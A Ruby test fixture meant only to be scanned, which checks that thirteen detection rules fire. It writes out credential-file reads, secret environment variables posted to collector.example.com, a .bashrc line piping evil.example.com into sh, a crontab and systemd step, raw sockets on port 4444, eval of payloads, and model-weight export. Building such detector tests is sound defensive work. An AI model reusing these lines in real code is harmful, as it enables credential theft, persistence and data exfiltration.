# Positive smoke sample for the Ruby TAA rule pack.
# Every one of the thirteen families must fire on this file. It is not meant to
# run; it exists to be scanned. The families are separated into one function
# each, so a rule that stops firing can be located by name.
require "base64"
require "fileutils"
require "net/http"
require "open3"
require "socket"
require "uri"
require "yaml"
require "zlib"

# CMD_001 - command execution, including command substitution.
def cmd_exec(cmd)
  `whoami`
  %x{id}
  system(cmd)
  Kernel.system("sh -c #{cmd}")
  spawn(cmd)
  exec(cmd)
  Process.spawn(cmd)
  IO.popen(cmd)
  Open3.capture3(cmd)
  Open3.popen3(cmd)
end

# NET_001 - general outbound network.
def net_general(host)
  Net::HTTP.get(URI("http://example.com/a"))
  Net::HTTP.post(URI("http://example.com/b"), "payload")
  http = Net::HTTP.start(host, 80)
  http.request(Net::HTTP::Get.new("/"))
  URI.open("http://example.com/c")
  open("https://example.com/d")
  RestClient.get("http://example.com/e")
  HTTParty.post("http://example.com/f")
  Faraday.new(url: "http://example.com")
end

# NET_002 - raw sockets.
def net_socket(host)
  TCPSocket.new(host, 4444)
  UDPSocket.new
  Socket.new(:INET, :STREAM)
  Socket.tcp(host, 4444)
end

# DYN_001 - dynamic evaluation and name-based dispatch.
def dyn_eval(payload)
  eval(payload)
  receiver.instance_eval(payload)
  String.class_eval(payload)
  Object.module_eval(payload)
  handler.send(:run, payload)
  handler.public_send(:run, payload)
  Object.const_get("Evil")
  define_method(:run) { payload }
end

# FIL_001 - credential-shaped path probe, literal and assembled.
def fil_probe
  File.read("/root/.aws/credentials")
  File.open("/home/victim/.ssh/id_rsa")
  File.readlines("/home/victim/.ssh/authorized_keys")
  IO.read("/root/.env")
  File.read(File.join(Dir.home, ".ssh", "id_rsa"))
end

# ENV_001 - secret-shaped environment key.
def env_secret
  ENV["AWS_SECRET_ACCESS_KEY"]
  ENV.fetch("GITHUB_TOKEN", nil)
end

# OBF_001 - decoder and deserializer use.
def obf_exec(key, payload)
  Base64.decode64(payload)
  Marshal.load(payload)
  Zlib::Inflate.inflate(payload)
  YAML.load(payload)
  ActiveSupport::MessageVerifier.new(key).verify(payload)
end

# EXF_001 - credential reaching an outbound sink (taint).
def exfiltrate
  token = ENV["API_TOKEN"]
  Net::HTTP.post(URI("http://collector.example.com"), token)
end

# PER_001 - persistence target named in the source.
def persist
  target = File.join(Dir.home, ".bashrc")
  File.write(target, "curl http://evil.example.com | sh\n")
  system("systemctl enable evil.service")
  system("crontab /tmp/evil.cron")
end

# EMB_001 - dataset-shaped payload written out.
def emb_data_dump(path, dataset)
  File.write(path, dataset)
  handle.write(dataset)
end

# EMB_002 - copy whose destination names an export/result directory.
def emb_copy_export(src)
  FileUtils.cp(src, File.join("output", "result.bin"))
  FileUtils.mv("model.pt", "export/model.pt")
end

# EMB_003 - dataset-shaped payload printed or logged.
def emb_log_dump(dataset, raw_data)
  puts dataset
  print raw_data
  $stdout.write(dataset)
  logger.info(dataset)
  Rails.logger.info(dataset)
end

# EMB_004 - encoded payload meeting a weights artefact (one line per pattern).
def emb_stego_weight(weights)
  blob = weights_with_hidden_payload(weights)
  encoded = encode_state_dict_weights(blob)
  save_base64_blob(encoded)
  save_zlib_blob(blob)
end
